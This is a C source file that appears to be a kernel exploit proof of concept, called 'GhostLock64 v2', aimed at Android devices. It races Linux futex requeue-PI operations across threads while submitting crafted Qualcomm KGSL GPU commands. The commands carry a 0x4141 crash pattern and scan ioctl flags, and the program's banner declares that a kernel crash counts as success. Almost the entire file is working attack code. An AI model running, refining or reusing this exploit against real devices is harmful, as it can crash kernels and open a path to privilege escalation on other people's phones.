#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) goto out;
    printf("[kgsl] fd=%d\n", fd);

    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, 0xc0080913, &ctx);
    printf("[kgsl] CREATE: ret=%d id=%u\n", (int)r, ctx.id);
    if (r < 0) goto out;

    /* CRASH PATTERN */
    struct { uint64_t ga; uint64_t sw; } ib = {
        0x0ULL, 0x4141414141414141ULL
    };

    /* ── TEST BOTH COMMANDS ── */
    
    /* 1. COMPAT cmd (0xc0140910) — worked in test_ib_flags! */
    printf("\n[kgsl] --- Compat cmd 0xc0140910 ---\n");
    {
        struct { uint32_t c; uint32_t f; uint32_t p; uint32_t t; uint32_t n; }
            cmd = {ctx.id, 0, (uint32_t)(uintptr_t)&ib, 0, 1};
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        printf("  compat cmd: ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU!":"");
    }

    /* 2. Native cmd (0xc0200910) */
    printf("\n[kgsl] --- Native cmd 0xc0200910 ---\n");
    {
        struct {
            uint32_t c; uint32_t f;
            uint64_t p;
            uint32_t n; uint32_t pad;
            uint32_t t; uint32_t pad2;
        } cmd = {ctx.id, 0, (uint64_t)(uintptr_t)&ib, 1, 0, 0, 0};
        errno = 0; r = ioctl(fd, 0xc0200910, &cmd);
        printf("  native cmd: ret=%d errno=%d %s\n", (int)r, errno,
               r==0?"⚠️ CFU!":"");
    }

    /* 3. Compat cmd with different flags */
    printf("\n[kgsl] --- Compat cmd flag scan ---\n");
    for (int fi = 0; fi < 8; fi++) {
        uint32_t flag = 1u << fi;
        struct { uint32_t c; uint32_t f; uint32_t p; uint32_t t; uint32_t n; }
            cmd = {ctx.id, flag, (uint32_t)(uintptr_t)&ib, 0, 1};
        errno = 0; r = ioctl(fd, 0xc0140910, &cmd);
        if (r == 0) printf("  flag=0x%08x: ✅ SUCCESS!\n", flag);
    }

    ioctl(fd, 0x40040914, &ctx.id);
out:
    if (fd >= 0) close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    while (!kgsl_done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  GhostLock64 v2 — Both cmds         ║\n");
    printf("║  ⚠️  KERNEL CRASH = SUCCESS         ║\n");
    printf("╚══════════════════════════════════════╝\n\n");
    f_wait=0; f_pi_target=0; f_pi_chain=0;
    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0); usleep(200000);
    pthread_create(&ot, 0, owner, 0); usleep(300000);
    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ ret=%ld\n\n", r); break; }
        usleep(1000);
    }
    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED ===\n");
    return 0;
}
